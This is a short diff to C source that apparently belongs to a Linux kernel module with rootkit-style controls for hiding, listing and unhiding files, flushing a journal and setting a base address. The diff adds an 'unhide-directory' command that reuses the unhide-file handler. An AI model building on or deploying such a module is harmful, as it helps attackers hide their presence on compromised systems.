@@ -435,6 +435,7 @@ enum {
     Opt_hide_file_anywhere,
     Opt_list_hidden_files,
     Opt_unhide_file,
+    Opt_unhide_directory,
 
     /** misc */
     Opt_journalclt,
@@ -456,6 +457,7 @@ static const match_table_t tokens = {
     {Opt_hide_file_anywhere, "hide-file-anywhere=%s"},
     {Opt_list_hidden_files,"list-hidden-files"},
     {Opt_unhide_file, "unhide-file=%s"},
+    {Opt_unhide_directory, "unhide-directory=%s"},
 
     {Opt_journalclt, "journal-flush"},
     {Opt_fetch_base_address, "base-address=%d"},
@@ -557,7 +559,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             case Opt_list_hidden_files:
                 fs_list_names();
                 break;
+
             case Opt_unhide_file:
+            case Opt_unhide_directory:
                  fs_del_name(args[0].from);
                 break;
             case Opt_journalclt:
